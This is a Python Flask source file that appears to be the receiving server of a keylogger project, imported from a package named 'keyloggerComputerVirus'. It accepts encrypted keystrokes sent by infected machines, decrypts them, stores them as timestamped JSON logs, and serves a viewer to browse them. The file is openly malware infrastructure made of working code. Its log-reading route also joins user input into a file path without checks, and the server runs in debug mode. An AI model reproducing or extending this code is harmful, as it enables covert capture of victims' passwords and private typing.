import os
import json
from keyloggerComputerVirus.Encryption import Decoding
from flask import Flask, request, jsonify,json,send_file
from datetime import datetime




app = Flask(__name__)

data = []


@app.route('/', methods=['POST'])
def receive_log():
    temp_data = request.get_json(silent=True)
    if not temp_data or 'message' not in temp_data:
        return jsonify({"error": "Invalid data"}), 400
    key_presses = temp_data['message']
    decoded_presses = []
    # Loop through each encrypted key press and decode it
    for press in key_presses:
        dec = Decoding(press)
        decoded_key = dec.decoding_cipher()
        decoded_presses.append(decoded_key)

    data.append(decoded_presses)
    create_json_file(data)
    # apter we create file we clear data for next time
    data.clear()

    return jsonify({"status": "success", "received": decoded_presses}), 200


def create_json_file(data, file_path="./Logs"):
    os.makedirs(file_path, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"log_{timestamp}.json"
    full_path = os.path.join(file_path, file_name)
    with open(full_path, "w") as file:
        json.dump(data, file, indent=4)
    print(f"Log saved: {full_path}")


@app.route('/', methods=['GET'])
def index():
    return send_file('templates/log_viewer.html')


@app.route('/logs', methods=['GET'])
def list_logs():
    log_dir = "./Logs"
    if not os.path.exists(log_dir):
        return jsonify({"files": []})

    files = []
    for filename in os.listdir(log_dir):
        if filename.endswith(".json"):
            # Extract date from filename or use file creation date
            try:
                # Try to parse date from filename (log_YYYY-MM-DD_HH-MM-SS.json)
                date_str = filename.replace("log_", "").replace(".json", "")
                date = datetime.strptime(date_str, "%Y-%m-%d_%H-%M-%S")
            except:
                # If parsing fails, use file creation time
                file_path = os.path.join(log_dir, filename)
                date = datetime.fromtimestamp(os.path.getctime(file_path))

            files.append({
                "name": filename,
                "date": date.isoformat(),
                "path": os.path.join(log_dir, filename)
            })

    return jsonify({"files": files})


@app.route('/logs/<filename>', methods=['GET'])
def get_log_content(filename):
    log_dir = "./Logs"
    file_path = os.path.join(log_dir, filename)

    if not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 404

    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True, port=5000)